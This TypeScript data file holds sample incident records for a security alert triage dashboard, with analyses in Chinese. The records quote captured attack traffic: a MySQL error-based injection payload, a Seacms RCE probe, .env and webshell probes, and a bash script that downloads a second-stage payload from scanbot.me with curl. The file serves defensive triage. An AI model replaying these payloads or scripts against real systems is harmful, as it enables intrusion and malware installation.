export interface AlertTableColumn {
  key: string;
  label: string;
  description?: string;
  widthClass?: string;
  mono?: boolean;
}

export interface AlertTableCell {
  value: string;
  detail?: string;
  tone?: 'red' | 'orange' | 'blue' | 'green' | 'purple' | 'slate';
  mono?: boolean;
}

export interface IncidentCluster {
  id: string;
  sourceRecordId: string;
  observedAt: string;
  rawAlerts: number;
  confidence: number;
  priority: 'P1' | 'P2';
  reason: string;
  owner: string;
  srcIp: string;
  ndrRule: string;
  request: {
    method: string;
    host: string;
    uri: string;
    payload: string;
    llmAnalysis: string;
    evidence: string[];
  };
  response: {
    statusCode: number;
    llmAnalysis: string;
    evidence: string[];
    sample: string;
  };
  srcIntel: {
    verdict: string;
    location: string;
    tags: string[];
    summary: string;
  };
  asset: {
    name: string;
    business: string;
    exposure: string;
    owner: string;
    criticality: string;
    context: string;
  };
  conclusion: {
    verdict: string;
    summary: string;
    recommendation: string;
  };
  actions: string[];
  title: string;
  triageReport?: string;
  tableCells?: Record<string, AlertTableCell>;
}

export const alertAssetSummary = {
  sourcePageId: 'alert-denoise-triage-dashboard',
  sourceAssetDate: '2026-06-24',
  sourceAssetFile: 'assets/2026-06-24/dedup_result_001.jsonl',
  totalRaw: 6427,
  totalUnique: 846,
  duplicates: 5581,
  attackSuccess: 208,
  attack: 413,
  attackFailed: 225,
  representativeCount: 10,
};

export const incidentClusters = [
  {
    id: 'ASSET-001',
    sourceRecordId: '69a49201-fc33-336c-9974-23129dddba67',
    observedAt: '2026-05-18 14:48:51',
    rawAlerts: 411,
    confidence: 93,
    priority: 'P1',
    title: 'tailscale内网穿透',
    reason: '检测到 tailscale 内网穿透工具流量，属于横向方向的隧道类可疑通信。',
    owner: '内网安全组',
    srcIp: '2402:f000:0004:1005:0809:0322:64d0:7649',
    ndrRule: 'S3100110036',
    request: {
      method: 'POST',
      host: 'controlplane.tailscale.com:80',
      uri: '/ts2021',
      payload: 'POST /ts2021 HTTP/1.1',
      llmAnalysis: '请求命中 Tailscale 控制面握手路径 /ts2021，方向为 lateral，说明内网主机正在尝试建立穿透控制通道。',
      evidence: ['lateral 横向方向', 'Upgrade: tailscale-control-protocol', 'LSH 聚合 411 条相似告警'],
    },
    response: {
      statusCode: 101,
      llmAnalysis: '响应为 101 Switching Protocols，表示服务端接受协议升级，隧道类通信很可能已经进入连接建立阶段。',
      evidence: ['HTTP 101', 'Switching Protocols', 'Upgrade: tailscale-control-protocol'],
      sample: 'HTTP/1.1 101 Switching Protocols',
    },
    srcIntel: {
      verdict: '横向穿透',
      location: 'TDP assets 样例 / lateral',
      tags: ['post_exploit', 'tunneling', 'tdp'],
      summary: '来源记录来自自定义页面 assets 文件，阶段为 post_exploit，类型为 tunneling，应优先确认该主机是否允许使用内网穿透工具。',
    },
    asset: {
      name: '2606:b740:0049:0000:0000:0000:0000:0113',
      business: 'Tailscale 控制面访问目标',
      exposure: '横向',
      owner: '内网安全组',
      criticality: '高',
      context: '目标端口为 80，主机访问 controlplane.tailscale.com:80，符合穿透工具控制面通信特征。',
    },
    conclusion: {
      verdict: '攻击行为',
      summary: '该告警为内网穿透工具通信，虽然未直接证明主机失陷，但已经形成横向控制通道风险。',
      recommendation: '确认源主机归属与软件安装授权；若无授权，隔离源主机并阻断 Tailscale 控制面域名和相关出站连接。',
    },
    actions: ['确认源主机归属', '核查 Tailscale 安装记录', '阻断未授权穿透连接', '排查同源主机进程与启动项'],
  },
  {
    id: 'ASSET-002',
    sourceRecordId: '4d0c8fee-5598-3a27-a2df-fd7c7d8a582a',
    observedAt: '2026-05-18 14:50:26',
    rawAlerts: 5,
    confidence: 79,
    priority: 'P2',
    title: 'Webshell扫描',
    reason: '在 HTTP 流量中检测到 WebShell 扫描路径访问。',
    owner: '边界安全组',
    srcIp: '2607:ff28:9005:006b:0225:90ff:fe56:582c',
    ndrRule: 'D121236467e',
    request: {
      method: 'GET',
      host: 'www.sdau.edu.cn',
      uri: '/wp-admin/wp.php',
      payload: 'GET /wp-admin/wp.php HTTP/1.1',
      llmAnalysis: '请求访问 wp-admin 下的可疑 PHP 路径，属于常见 WebShell 探测行为。',
      evidence: ['/wp-admin/wp.php', 'WebShell 扫描规则命中', '入站 HTTP 请求'],
    },
    response: {
      statusCode: 302,
      llmAnalysis: '响应为 302 跳转，没有直接证明文件存在或命令执行，但说明目标路径被 Web 服务处理。',
      evidence: ['HTTP 302', '规则 D121236467e', '阶段 recon'],
      sample: 'HTTP/1.1 302 Moved Temporarily',
    },
    srcIntel: {
      verdict: '外部扫描源',
      location: 'TDP assets 样例 / in',
      tags: ['recon', 'webshell', 'tdp'],
      summary: '源地址触发 WebShell 扫描特征，建议按低成本探测流量聚合处置。',
    },
    asset: {
      name: 'www.sdau.edu.cn',
      business: 'Web 站点',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '目标为公网 Web 服务，访问路径位于管理目录，应确认是否存在异常 PHP 文件或弱配置。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警属于 WebShell 扫描探测，当前响应未显示脚本执行成功。',
      recommendation: '将源地址加入扫描观察列表，复核目标目录是否存在可执行脚本，并确认 WAF 是否已有对应阻断策略。',
    },
    actions: ['加入扫描源观察', '复核 Web 目录可执行权限', '检查同源后续请求', '确认 WAF 规则命中情况'],
  },
  {
    id: 'ASSET-003',
    sourceRecordId: '92176780-bf51-30b4-aae5-b8b3b35aba85',
    observedAt: '2026-05-18 14:48:28',
    rawAlerts: 7,
    confidence: 79,
    priority: 'P2',
    title: '敏感信息泄露攻击',
    reason: '检测到针对 .env.backup 的敏感信息泄露漏洞攻击。',
    owner: '边界安全组',
    srcIp: '2607:ff28:c005:015e:0ec4:7aff:fe8e:a22f',
    ndrRule: 'S3100140342',
    request: {
      method: 'GET',
      host: 'yugong.fudan.edu.cn',
      uri: '/.env.backup',
      payload: 'GET /.env.backup HTTP/1.1',
      llmAnalysis: '请求直接访问备份环境变量文件，意图获取配置、密钥或数据库连接信息。',
      evidence: ['/.env.backup', '敏感信息泄露规则命中', 'exploit 阶段'],
    },
    response: {
      statusCode: 0,
      llmAnalysis: 'assets 记录未携带有效响应码和响应体，当前只能确认攻击尝试，成功性需要结合 Web 日志复核。',
      evidence: ['无有效响应码', '无响应体样本', '首见告警'],
      sample: 'assets 记录未提供响应体',
    },
    srcIntel: {
      verdict: '可疑扫描源',
      location: 'TDP assets 样例 / in',
      tags: ['exploit', 'env', 'tdp'],
      summary: '该源地址尝试访问环境变量备份文件，属于敏感配置探测。',
    },
    asset: {
      name: 'yugong.fudan.edu.cn',
      business: 'Web 站点',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '目标主机被请求 /.env.backup，应确认部署目录是否曾遗留备份配置文件。',
    },
    conclusion: {
      verdict: '攻击行为',
      summary: '该告警为敏感配置文件探测，当前缺少响应证据，需按可能泄露风险复核。',
      recommendation: '检查目标站点是否暴露 .env、.env.backup 等配置文件，并在边界侧阻断同类路径访问。',
    },
    actions: ['排查敏感配置文件暴露', '阻断 .env 类路径访问', '检索同源扫描范围', '复核 Web 访问日志'],
  },
  {
    id: 'ASSET-004',
    sourceRecordId: '9ff9dbfb-b053-3be9-9466-df5021c9215b',
    observedAt: '2026-05-18 14:50:16',
    rawAlerts: 3,
    confidence: 79,
    priority: 'P2',
    title: '敏感文件访问',
    reason: '检测到爆破 URL 获取敏感文件路径。',
    owner: '边界安全组',
    srcIp: '2602:fb54:1a00:0000:0000:0000:0000:006a',
    ndrRule: 'D10582db198',
    request: {
      method: 'GET',
      host: 'ztb.ntu.edu.cn',
      uri: '/api/.env',
      payload: 'GET /api/.env HTTP/1.1',
      llmAnalysis: '请求目标为 /api/.env，属于典型敏感文件路径枚举。',
      evidence: ['/api/.env', '敏感文件访问规则命中', 'recon 阶段'],
    },
    response: {
      statusCode: 404,
      llmAnalysis: '响应为 404，说明当前路径未命中有效文件，攻击尝试未获得敏感内容。',
      evidence: ['HTTP 404', '错误提示页面', '响应体未包含配置内容'],
      sample: '<title>错误提示页面-404</title>',
    },
    srcIntel: {
      verdict: '外部探测源',
      location: 'TDP assets 样例 / in',
      tags: ['recon', 'sensitive-file', 'tdp'],
      summary: '该源地址执行敏感文件枚举，需要关注同源是否继续探测其他路径。',
    },
    asset: {
      name: 'ztb.ntu.edu.cn',
      business: 'Web 站点',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '目标返回 404，当前路径未发现泄露，但应确认配置文件访问规则已统一阻断。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警为敏感文件探测，响应码显示未命中文件。',
      recommendation: '保留同源扫描观察，确认不存在其他敏感路径 200 响应。',
    },
    actions: ['检索同源请求', '确认敏感文件路径阻断策略', '检查 200 响应路径', '按低优先级归档'],
  },
  {
    id: 'ASSET-005',
    sourceRecordId: '0b919680-c72e-3c7c-ab95-75e23f2115a2',
    observedAt: '2026-05-18 14:51:19',
    rawAlerts: 10,
    confidence: 79,
    priority: 'P2',
    title: 'Laravel Framework env配置文件敏感信息泄露攻击(CVE-2017-16894)',
    reason: '检测到 Laravel Framework env 配置文件敏感信息泄露漏洞攻击。',
    owner: '边界安全组',
    srcIp: '2602:fb54:1400:0000:0000:0000:0000:01d6',
    ndrRule: 'S3100166879',
    request: {
      method: 'GET',
      host: 'xgb.usx.edu.cn',
      uri: '/app/.env',
      payload: 'GET /app/.env HTTP/1.1',
      llmAnalysis: '请求路径 /app/.env 命中 Laravel 配置泄露漏洞利用特征，攻击者尝试读取应用配置。',
      evidence: ['/app/.env', 'CVE-2017-16894', 'Laravel env 配置泄露'],
    },
    response: {
      statusCode: 403,
      llmAnalysis: '响应为 403，说明访问被禁止，当前证据更偏向拦截或权限控制生效。',
      evidence: ['HTTP 403', 'Forbidden 页面', '未返回配置内容'],
      sample: '<title>403</title>',
    },
    srcIntel: {
      verdict: '外部漏洞扫描源',
      location: 'TDP assets 样例 / in',
      tags: ['recon', 'laravel', 'cve-2017-16894'],
      summary: '该源地址针对 Laravel 配置文件暴露进行探测，当前响应显示访问受限。',
    },
    asset: {
      name: 'xgb.usx.edu.cn',
      business: 'Laravel Web 站点',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '路径 /app/.env 被访问，虽然返回 403，仍需确认部署目录和 Web 服务器 deny 规则完整。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警为 Laravel env 配置文件读取尝试，访问控制已阻止返回敏感内容。',
      recommendation: '确认所有 .env 路径均被禁止访问，并检查是否存在其它 Laravel 敏感路径探测。',
    },
    actions: ['确认 deny 规则', '检索 Laravel 敏感路径', '检查配置文件权限', '保留扫描源画像'],
  },
  {
    id: 'ASSET-006',
    sourceRecordId: 'ee3b3b1a-d131-398c-9f10-9e4da2c159fb',
    observedAt: '2026-05-18 15:19:02',
    rawAlerts: 8,
    confidence: 79,
    priority: 'P2',
    title: '管理后台探测',
    reason: '检测到攻击者探测是否存在管理后台。',
    owner: '边界安全组',
    srcIp: '2404:8000:1099:00e9:6550:6cc5:aee9:da39',
    ndrRule: 'D106017f934',
    request: {
      method: 'GET',
      host: '365.sjtu.edu.cn',
      uri: '/admin/index.php',
      payload: 'GET /admin/index.php HTTP/1.1',
      llmAnalysis: '请求命中常见管理后台路径，属于登录入口发现和后台探测。',
      evidence: ['/admin/index.php', '管理后台探测规则命中', 'recon 阶段'],
    },
    response: {
      statusCode: 302,
      llmAnalysis: '响应为 302 跳转，说明该路径被 Web 服务处理，需确认是否跳转至登录页或访问控制页面。',
      evidence: ['HTTP 302', 'Temporarily Moved', '管理路径存在处理逻辑'],
      sample: 'HTTP/1.1 302 Temporarily Moved',
    },
    srcIntel: {
      verdict: '外部探测源',
      location: 'TDP assets 样例 / in',
      tags: ['recon', 'admin-probe', 'tdp'],
      summary: '该源地址探测管理后台入口，可能是漏洞利用前的指纹确认行为。',
    },
    asset: {
      name: '365.sjtu.edu.cn',
      business: 'Web 管理入口',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '目标路径 /admin/index.php 返回跳转，需要确认是否应暴露在公网。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警为管理后台探测，当前无登录绕过或命令执行证据。',
      recommendation: '确认管理入口访问范围，建议限制公网直接访问并增加登录口风控。',
    },
    actions: ['确认后台入口暴露面', '限制公网访问', '检查同源探测路径', '强化登录口防护'],
  },
  {
    id: 'ASSET-007',
    sourceRecordId: '8c9524cc-97d9-31b2-9c65-13e5d01eecc4',
    observedAt: '2026-05-18 14:52:15',
    rawAlerts: 2,
    confidence: 86,
    priority: 'P2',
    title: '恶意软件',
    reason: 'HTTP 会话访问可疑可执行文件路径，响应返回重定向脚本。',
    owner: '边界安全组',
    srcIp: '2001:0da8:c803:7028:4c8a:061f:f913:3d8b',
    ndrRule: 'T662a769e51dd258',
    request: {
      method: 'GET',
      host: 'srndndubsbsifurfd.biz',
      uri: '/s.exe',
      payload: 'GET /s.exe HTTP/1.1',
      llmAnalysis: '请求下载 s.exe，命中恶意软件相关告警。响应内容为跳转脚本，可能已被 DNS 或安全策略阻断。',
      evidence: ['/s.exe', '恶意软件规则命中', '出站访问'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应状态为 200，但内容为阻断跳转页面，未观察到真实可执行文件落地。',
      evidence: ['HTTP 200', 'block.onedns.net', '响应为重定向脚本'],
      sample: 'window.location.href="http://...block.onedns.net"',
    },
    srcIntel: {
      verdict: '出站恶意软件访问',
      location: 'TDP assets 样例 / out',
      tags: ['control', 'c2', 'tdp'],
      summary: '源地址访问可疑可执行文件域名，当前响应显示被安全解析或阻断页面接管。',
    },
    asset: {
      name: 'srndndubsbsifurfd.biz',
      business: '外部可疑下载站点',
      exposure: '互联网出站',
      owner: '边界安全组',
      criticality: '中高',
      context: '访问路径为 /s.exe，应关联终端侧下载、浏览器和进程事件确认是否落地。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警显示出站恶意软件下载尝试，但响应内容表明被安全策略阻断或重定向。',
      recommendation: '核查源终端是否存在文件落地和执行痕迹，并将域名加入临时阻断。',
    },
    actions: ['核查终端下载记录', '封禁可疑域名', '关联 EDR 进程树', '确认 DNS 阻断策略'],
  },
  {
    id: 'ASSET-008',
    sourceRecordId: '43582131-ca57-365c-be51-6caa0b8f3ea8',
    observedAt: '2026-05-18 14:49:01',
    rawAlerts: 120,
    confidence: 86,
    priority: 'P2',
    title: '公网脚本下载',
    reason: '检测到内网尝试获取公网脚本，需要确认下载行为是否为恶意。',
    owner: '边界安全组',
    srcIp: '2001:0da8:0211:b029:63e4:f444:a82c:2c47',
    ndrRule: 'S3100171860',
    request: {
      method: 'GET',
      host: 'scanbot.me',
      uri: '/?gvc',
      payload: 'GET /?gvc HTTP/1.1',
      llmAnalysis: '请求访问 scanbot.me 并返回 shell 脚本内容，脚本包含主机指纹采集、下载二阶段文件和执行逻辑。',
      evidence: ['scanbot.me', '响应包含 #!/bin/bash', '二阶段下载脚本'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应体包含 shell 脚本，具备下载并执行二阶段程序的行为，成功性较高。',
      evidence: ['HTTP 200', '#!/bin/bash', 'curl/wget 下载并执行'],
      sample: '#!/bin/bash arch=$(uname -m) ... curl -fsSLo -bash -- "http://scanbot.me/?gbot=${arch}"',
    },
    srcIntel: {
      verdict: '公网脚本下载源',
      location: 'TDP assets 样例 / in',
      tags: ['control', 'file', 'tdp'],
      summary: '该会话返回可执行 shell 脚本，应立即关联终端侧文件落地和进程执行证据。',
    },
    asset: {
      name: 'scanbot.me',
      business: '外部脚本分发站点',
      exposure: '互联网',
      owner: '边界安全组',
      criticality: '高',
      context: '响应体存在主机指纹采集和二阶段载荷下载行为，具备实际执行风险。',
    },
    conclusion: {
      verdict: '攻击成功',
      summary: '该告警显示内网主机获取到公网脚本内容，响应证据支持脚本下载成功。',
      recommendation: '封禁 scanbot.me，排查源主机是否执行脚本或落地 -bash 文件，并清理同源关联任务。',
    },
    actions: ['封禁 scanbot.me', '排查源主机落地文件', '检查 curl/wget 执行记录', '检索同脚本下载事件'],
  },
  {
    id: 'ASSET-009',
    sourceRecordId: 'd8ebf66a-1a77-34e6-ad73-41dc75a6446f',
    observedAt: '2026-05-18 14:49:02',
    rawAlerts: 414,
    confidence: 86,
    priority: 'P2',
    title: 'SQL注入攻击',
    reason: '检测到 SQL 注入攻击。',
    owner: '边界安全组',
    srcIp: '2a01:04f9:c012:cd78:0000:0000:0000:0001',
    ndrRule: 'D1181087257',
    request: {
      method: 'GET',
      host: 'arch.hnu.edu.cn',
      uri: '/comment/api/index.php?gid=1&page=2&rlist[]=...',
      payload: "GET /comment/api/index.php?gid=1&page=2&rlist[]=@`'`, extractvalue(1, concat_ws(0x20, 0x5c,(select md5(202072102)))),@`'` HTTP/1.1",
      llmAnalysis: '请求参数包含 extractvalue 与 select md5(...)，属于 MySQL 报错注入探测特征。',
      evidence: ['extractvalue 函数', 'select md5(...)', 'SQL 注入规则命中'],
    },
    response: {
      statusCode: 404,
      llmAnalysis: '响应为 404 错误页面，没有观察到数据库报错或注入回显，当前判断攻击失败。',
      evidence: ['HTTP 404', '未返回 SQL 报错', '错误提示页面'],
      sample: '<title>404错误提示</title>',
    },
    srcIntel: {
      verdict: '外部漏洞扫描源',
      location: 'TDP assets 样例 / in',
      tags: ['exploit', 'sqli', 'tdp'],
      summary: '同一 LSH 聚合中共有 414 条相似 SQL 注入请求，应按批量扫描源跟踪。',
    },
    asset: {
      name: 'arch.hnu.edu.cn',
      business: 'Web 应用',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '目标接口返回 404，没有成功利用证据，但同类请求量较高。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警为 SQL 注入探测，响应证据不支持成功利用。',
      recommendation: '继续观察同源扫描，确认目标接口不存在其他 200 或数据库错误响应。',
    },
    actions: ['关联同源 SQLi 请求', '确认接口错误响应', '检查 WAF 命中情况', '保留扫描源画像'],
  },
  {
    id: 'ASSET-010',
    sourceRecordId: '868f6706-dc7c-3242-9c74-bb96615cc714',
    observedAt: '2026-05-18 14:49:23',
    rawAlerts: 112,
    confidence: 86,
    priority: 'P2',
    title: 'Seacms前台远程代码执行',
    reason: '检测到扫描 Seacms 前台远程代码执行漏洞。',
    owner: '边界安全组',
    srcIp: '2a01:04f9:c012:cd78:0000:0000:0000:0001',
    ndrRule: 'S2020101417',
    request: {
      method: 'POST',
      host: 'adcatal.hnu.edu.cn',
      uri: '/search.php',
      payload: 'searchtype=5&searchword={if{searchpage:year}...printf(md5(2026969413));',
      llmAnalysis: '请求体包含模板表达式拼接和 printf(md5(...)) 测试语句，符合 Seacms 前台 RCE 探测特征。',
      evidence: ['POST /search.php', 'printf(md5(...))', 'Seacms RCE 规则命中'],
    },
    response: {
      statusCode: 404,
      llmAnalysis: '响应为 404，没有观察到 md5 回显或代码执行结果，当前判断攻击失败。',
      evidence: ['HTTP 404', '未出现 md5 回显', '错误提示页面'],
      sample: '<title>404错误提示</title>',
    },
    srcIntel: {
      verdict: '外部漏洞扫描源',
      location: 'TDP assets 样例 / in',
      tags: ['exploit', 'rce', 'tdp'],
      summary: '该源地址与 SQL 注入探测源一致，说明存在批量漏洞扫描活动。',
    },
    asset: {
      name: 'adcatal.hnu.edu.cn',
      business: 'Web 应用',
      exposure: '公网',
      owner: '边界安全组',
      criticality: '中',
      context: '目标路径 /search.php 返回 404，当前没有 RCE 成功证据。',
    },
    conclusion: {
      verdict: '攻击失败',
      summary: '该告警为 Seacms RCE 探测，响应不支持成功利用。',
      recommendation: '确认资产是否运行 Seacms，若不相关可按扫描噪声归档；若相关，补充版本和补丁状态核查。',
    },
    actions: ['确认应用指纹', '检查 Seacms 版本', '关联同源 RCE 探测', '按资产归属推送修复建议'],
  },
] satisfies IncidentCluster[];
